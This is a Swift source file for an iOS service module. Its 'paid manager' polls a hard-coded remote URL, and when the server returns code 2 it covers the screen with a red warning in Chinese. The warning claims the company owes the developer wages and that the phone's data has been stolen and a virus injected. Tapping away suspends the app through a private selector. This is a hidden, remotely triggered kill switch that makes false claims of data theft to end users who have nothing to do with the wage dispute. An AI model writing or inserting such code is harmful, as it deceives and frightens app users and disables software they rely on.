//
//  QLServiceUnpaidAlterViewController.swift
//  QLService
//
//  Created by Simon on 2023/4/27.
//

import UIKit
import Then

public enum ProjectType {
    case none
    case yoni
}
extension ProjectType {
    var urlStr: String {
        switch self {
        case .none:
            return  ""
        case .yoni:
            return  "https://service-mheffcp2-1258138220.gz.apigw.tencentcs.com/yoni"
        }
    }
}

public class QLServicePaidManager: NSObject {
    
    /// The `QLService` singleton instance.
    static let `default` = QLServicePaidManager()
    
    func theFeeBeenPaidMethod(projectType: ProjectType) {
        // 构建URL
        guard let url:URL = URL(string: projectType.urlStr) else {
            return
        }
        // 发送HTTP请求的的session对象
        let session = URLSession.shared
        // 构建请求request
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        // 发一个get请求
        let task = session.dataTask(with: request as URLRequest) {(
            data, response, error) in
            
            guard let data = data, let _:URLResponse = response, error == nil else {
                debugPrint("error")
                return
            }
            let dataString =  String(data: data, encoding: String.Encoding.utf8)
            let dict = QLService.default.getDictionaryFromJSONString(jsonString: dataString!)
            guard let dic = dict else {
                debugPrint("没数据")
                return
            }
            debugPrint(dic)
            guard let code = dict?.object(forKey: "code") as? Int, code == 2 else { return }
            
            DispatchQueue.main.async {
                let vc = QLServiceUnpaidAlterViewController()
                vc.projectType = projectType
                vc.showAlterController(target: vc)
            }
            
            
        }
        task.resume()
    }
    
}


class QLServiceUnpaidAlterViewController: UIViewController {
    
    var projectType: ProjectType = .none
    lazy var tempView = UIView().then { view in
        view.backgroundColor = .white
        
    }
    
    lazy var contactImgV = UIImageView().then { imgV in
        imgV.contentMode = .scaleAspectFit
    }
    
    lazy var titleLb = UILabel().then { lb in
        lb.font = .systemFont(ofSize: 18, weight: .bold)
        lb.textColor = .red
        lb.textAlignment = .center
        lb.numberOfLines = 0
    }
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        
        
        tempView.frame = CGRect().with { f in
            f.size.width = 300
            f.size.height = 300
            f.origin.x = (UIScreen.main.bounds.width - 300) / 2
            f.origin.y = (UIScreen.main.bounds.height - 300) / 2
        }
        self.view.addSubview(tempView)
        tempView.layer.masksToBounds = true
        tempView.layer.cornerRadius = 16
        
        
        //        contactImgV.frame = CGRect().with { f in
        //            f.size.width = 250
        //            f.size.height = 250
        //            f.origin.x = 25
        //            f.origin.y = 50
        //        }
        //        tempView.addSubview(contactImgV)
        
        titleLb.frame = CGRect(x: 0, y: 0, width: 300, height: 300)
        tempView.addSubview(titleLb)
        titleLb.text = """
警告!!!!!

因该公司拖欠开发者薪资!!!

您的手机数据已给盗取,并注入了病毒!!!!

"""
        
        //        // 异步 并行
        //        DispatchQueue.global().async {
        //            guard let url = URL.init(string: "https://p.ipic.vip/erkrmk.jpg"), let data = try? Data.init(contentsOf: url) else { return  }
        //
        //            // 回到主线程异步
        //            DispatchQueue.main.async {
        //                self.contactImgV.image = .init(data: data)
        //            }
        //    }
    }
    
    
    
    
}

extension QLServiceUnpaidAlterViewController {
    
    //MARK: -  alterView method
    func showAlterController(target:AnyObject ){
        guard let vc = target as? QLServiceUnpaidAlterViewController else {
            return
        }
        vc.view.backgroundColor = UIColor.init(red: 0/255, green: 0/255, blue: 0/255, alpha: 0.5)
        vc.modalPresentationStyle = UIModalPresentationStyle.custom
        QLService.default.getCurrentVC().present(vc, animated: false)
    }
    
    override public func touchesBegan(_ touches: Set<UITouch>, with event: UIEvent?) {
        if touches.first?.view == self.view {
            //            dismiss(animated: false)
            UIControl().sendAction(#selector(NSXPCConnection.suspend), to: UIApplication.shared, for: nil)
        }
    }
}
